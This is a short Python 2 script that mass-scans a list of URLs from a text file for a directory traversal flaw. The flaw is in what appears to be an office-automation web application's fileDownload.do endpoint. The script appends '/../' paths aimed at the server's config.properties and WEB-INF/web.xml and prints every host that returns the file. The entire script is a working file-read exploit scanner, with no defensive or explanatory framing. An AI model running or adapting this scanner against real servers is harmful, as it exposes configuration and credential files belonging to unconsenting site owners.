import requests

def check(url):
    try:
        rep=requests.get(url,allow_redirects=False,timeout=3)
        if rep.status_code==200:
            print url
    except Exception,e:
        pass
test=0
with open('hello_world.txt','r') as f:
    for i in f.readlines():
        test+=1
        #print test
        url=i.strip('\n')
        test_url_1=url+'/oa/fileDownload.do?type=File&path=/../oaconsole/config/config.properties'
        test_url_2=url+'/oa/fileDownload.do?type=File&path=/../webapp/WEB-INF/web.xml'
        check(test_url_1)
        check(test_url_2)
        
